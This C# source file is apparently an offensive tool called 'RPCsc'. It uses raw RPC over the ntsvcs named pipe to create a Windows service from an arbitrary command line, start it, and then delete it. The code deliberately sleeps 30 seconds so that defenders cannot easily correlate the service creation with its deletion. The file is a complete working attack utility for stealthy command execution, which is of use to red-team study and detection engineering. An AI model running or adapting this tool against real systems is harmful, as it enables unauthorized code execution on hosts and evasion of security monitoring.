//Article https://www.x86matthew.com/view_post?id=create_svc_rpc 
//Using https://github.com/tyranid/WindowsRpcClients - https://raw.githubusercontent.com/tyranid/WindowsRpcClients/0ccb35c9684cbe54f4eb6673fdfaf06393c9f7ea/Win10_20H1/services.exe/367abb81-9844-35f1-ad32-98f038001003_2.0.cs

using System;
using System.Threading;
using static sc.NtAPI;

namespace RPCsc
{
    internal static class Program
    {
        private const int SERVICE_ALL_ACCESS = 0xF01FF; //is it really needed or SC_MANAGER_CREATE_SERVICE suffices?
        private const int SC_MANAGER_ALL_ACCESS = 0xF003F;
        private const int SERVICE_WIN32_OWN_PROCESS = 0x00000010; //also SERVICE_INTERACTIVE_PROCESS?
        private const int SERVICE_DEMAND_START = 0x00000003;
        private const int SERVICE_ERROR_IGNORE = 0x00000000;

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: RPCsc [servicename] [cmd_to_execute]");
            }
            else
            {
                using (Client client = new Client())
                {
                    try
                    {
                        Console.WriteLine(@"[*] Connecting to \\127.0.0.1\pipe\ntsvcs");
                        client.Connect("ntsvcs");
                        if (client.Connected)
                        {
                            Console.WriteLine(@"[*] Successfully connected to \\127.0.0.1\pipe\ntsvcs");
                            var returnstatus = client.ROpenSCManagerA("127.0.0.1", null, SC_MANAGER_ALL_ACCESS, out var RPCConnection);
                            if (returnstatus != 0)
                            {
                                Console.WriteLine($"[!] Unable to open Service Manager (ROpenSCManagerA). Status code returned: {returnstatus}");
                            }
                            else
                            {
                                Console.WriteLine("[*] Successfully opened Service Manager (ROpenSCManagerA)");
                                int? PasstheNull = null; //

                                var ServiceName = args[0];
                                var cmd = args[1];

                                returnstatus = client.RCreateServiceA(RPCConnection, ServiceName, ServiceName, SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, cmd, null, ref PasstheNull, null, 0, null, null, 0, out var ServiceHandle);
                                if (returnstatus != 0)
                                {
                                    if (returnstatus == 1073)
                                        Console.WriteLine("[!] Unable to create service (RCreateServiceW). The specified service already exists");
                                    else
                                        Console.WriteLine($"[!] Unable to create service (RCreateServiceW). Status code returned: {returnstatus}");
                                }
                                else
                                {
                                    Console.WriteLine($"[*] Successfully created service {ServiceName} with cmdline {cmd}.");
                                    Struct_6[] p2 = null;
                                    Console.WriteLine($"[*] Starting service {ServiceName}. Check your processes.");
                                    returnstatus = client.RStartServiceA(ServiceHandle, 0, p2);
                                    if (returnstatus != 0)
                                    {
                                        if (returnstatus == 1053)
                                            Console.WriteLine("[!] Unable to create service (RCreateServiceW). The service did not respond to the start or control request in a timely fashion. (Binary executes and then dies after 30s)");
                                        else
                                            Console.WriteLine($"[!] Unable to create service (RCreateServiceW). Status code returned: {returnstatus}");
                                    }
                                    else
                                        Console.WriteLine($"[*] Service: {ServiceName} is started.");
                                    Console.WriteLine("[*] Sleeping for 30s to avoid simple correlations between Service Creation / Service Deletion");
                                    Thread.Sleep(30000);
                                    Console.WriteLine($"[*] Deleting service {ServiceName}.");
                                    returnstatus = client.RDeleteService(ServiceHandle);
                                    if (returnstatus != 0)
                                    {
                                        Console.WriteLine($"[!] Unable to delete service (RDeleteService). Status code returned: {returnstatus}");
                                    }
                                    else
                                    {
                                        Console.WriteLine("[*] Successfully deleted the service.");
                                    }
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine("[!] Client was not able to connect to the pipe.");
                        }
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[!] Exception: {ex}");
                    }
                    client.Disconnect();
                }
            }
        }
    }
}

